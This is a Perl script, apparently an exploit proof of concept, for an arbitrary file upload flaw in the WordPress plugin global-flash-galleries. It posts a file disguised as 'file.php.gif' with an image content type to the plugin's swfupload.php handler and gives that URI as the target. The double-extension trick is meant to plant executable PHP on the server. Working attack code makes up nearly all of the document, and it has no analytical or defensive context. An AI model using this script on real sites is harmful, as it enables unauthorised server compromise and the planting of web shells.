#! /usr/bin/perl
  use LWP;
  use HTTP::Request::Common;
  
  my ($url, $file) = @ARGV;
  
  my $ua = LWP::UserAgent->new();
  my $req = POST $url,
    Content_Type => 'form-data',
    Content =>    [
  name => $name,
  galleryselect => 1, # Gallery ID (popup.php)
  Filedata => [ "$file", "file.php.gif",  Content_Type =>
  'image/gif' ]
            ];
  my $res = $ua->request( $req );
  if( $res->is_success ) {
    print $res->content;
  } else {
    print $res->status_line, "\n";
  }

--------------------
Example URI:
--------------------
http://www.example.com/wp-content/plugins/global-flash-galleries/swfupload.php
